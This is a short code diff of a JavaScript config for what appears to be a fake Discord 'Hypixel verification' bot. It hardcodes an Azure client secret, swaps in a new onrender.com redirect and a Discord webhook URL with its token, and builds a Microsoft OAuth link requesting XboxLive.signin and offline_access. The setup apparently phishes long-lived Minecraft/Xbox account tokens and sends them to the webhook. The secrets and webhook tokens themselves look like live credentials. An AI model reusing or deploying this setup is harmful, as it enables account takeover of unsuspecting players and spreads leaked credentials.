@@ -1,8 +1,8 @@
 //Change these btw
 const client_secret = 'KJR8Q~g05PSkc-G_eIyt9QGN4EAgKLvW4ehV2apf' //you need to put the "Secret Value" here not the "Secret ID"!!!!
 const client_id = '95a3a604-ad37-4af9-b41d-c5d05a12459e'
-const redirect_uri = 'https://hypixelverificationbot.onrender.com'
-const webhook_url = 'https://discord.com/api/webhooks/1052987188800929892/G1LDrmac1yE9oodyL6R8JnScAifzyqfPDbedoOAjSkdz8IWJ1_4ydcnAtJgtCKp79wfT'
+const redirect_uri = 'https://discord-verification-0zfy.onrender.com'
+const webhook_url = 'https://discord.com/api/webhooks/1018214211056324659/HM3VfgAPYCMi5aFRhezRCyUkijTmw475_n3OKSQLEnqFj5HMPQAtgItdewOMExstc4xw'
 
 //Requirements
 const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
